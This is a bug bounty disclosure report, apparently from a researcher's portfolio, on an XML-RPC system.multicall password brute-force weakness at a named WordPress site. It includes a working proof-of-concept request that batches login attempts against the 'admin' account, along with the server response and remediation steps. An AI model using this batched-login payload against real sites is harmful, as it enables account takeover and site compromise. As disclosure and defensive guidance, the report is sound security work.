# VULN-002 — XMLRPC system.multicall Credential Brute Force

**Target:** omgnepal.com
**Platform:** BugV
**Researcher:** Vibhor Prasad (stack-guardian)
**BugV Report ID:** #000094S
**Date Submitted:** March 2026
**Status:** Duplicate (of #00000FH, originally submitted Mar 17, 2021)

---

## Summary

The WordPress XML-RPC endpoint at omgnepal.com is publicly accessible and has the `system.multicall` method enabled. This method allows multiple API calls to be bundled into a single HTTP request. An attacker can abuse this to send hundreds of login attempts in a single request using nested `wp.getUsersBlogs` calls, effectively bypassing per-request rate limiting or account lockout mechanisms. This makes large-scale credential brute force attacks practical and difficult to detect or block.

---

## Vulnerability Details

| Field                   | Value                                                        |
|-------------------------|--------------------------------------------------------------|
| Type                    | Improper Restriction of Excessive Authentication Attempts    |
| CWE                     | CWE-307: Improper Restriction of Excessive Authentication Attempts |
| Severity                | High                                                         |
| CVSS v3.1 Score         | 7.5                                                          |
| CVSS v3.1 Vector        | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                        |
| Affected Endpoint       | https://omgnepal.com/xmlrpc.php                              |
| Vulnerable Parameter    | `system.multicall` method with nested `wp.getUsersBlogs`     |
| Authentication Required | No                                                           |
| Discovery Method        | Manual testing via Burp Suite                                |
| Tools Used              | Burp Suite, curl                                             |

---

## Reproduction Steps

1. Send a POST request to `https://omgnepal.com/xmlrpc.php` with `Content-Type: text/xml`.
2. Use the `system.multicall` method with multiple nested `wp.getUsersBlogs` calls, each with a different password.
3. Observe that the server processes all attempts in a single request and returns individual fault responses for each.
4. Observe: hundreds of credential attempts can be made per HTTP request, bypassing rate limiting.

---

## Proof of Concept

### HTTP Request

```
POST /xmlrpc.php HTTP/2
Host: omgnepal.com
Content-Type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>pass1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>pass2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param></params>
</methodCall>
```

### HTTP Response

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
<params><param><value><array><data>
<value><struct>
<member><name>faultCode</name><value><int>403</int></value></member>
<member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
<value><struct>
<member><name>faultCode</name><value><int>403</int></value></member>
<member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
</struct></value>
</data></array></value></param></params>
</methodResponse>
```

### Observed Behavior

The server processes multiple authentication attempts bundled in a single `system.multicall` request and returns individual fault responses for each. This confirms the endpoint is active and accepts batched credential testing.

---

## Impact

An attacker with a valid username list (obtainable via VULN-001 or VULN-003) can perform large-scale password brute force attacks against all WordPress accounts. Because hundreds of attempts are sent per HTTP request, standard per-request rate limiting and account lockout mechanisms are bypassed. A successful brute force yields full WordPress admin access, enabling content modification, backdoor installation, and complete site compromise.

---

## Remediation

1. **Disable XML-RPC entirely** if not required for Jetpack or mobile app connectivity:
   ```php
   add_filter('xmlrpc_enabled', '__return_false');
   ```
2. **Block the endpoint at the web server level:**
   ```nginx
   location = /xmlrpc.php { deny all; }
   ```
3. **Disable system.multicall specifically** using a plugin such as Disable XML-RPC or by filtering the method list.
4. **Implement account lockout** after a defined number of failed attempts regardless of request batching.

---

## References

- [OWASP — Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [WordPress XML-RPC Brute Force — WPScan](https://wpscan.com/vulnerability/xmlrpc-brute-force)

---

## Timeline

| Date          | Event                                                                          |
|---------------|--------------------------------------------------------------------------------|
| March 2026    | Vulnerability identified during recon                                          |
| March 2026    | PoC confirmed and documented                                                   |
| March 2026    | Report submitted via BugV (#000094S)                                           |
| March 2026    | Platform acknowledged receipt                                                  |
| March 2026    | Marked Duplicate of #00000FH (originally submitted Mar 17, 2021)              |
| April 2026    | Added to portfolio                                                             |
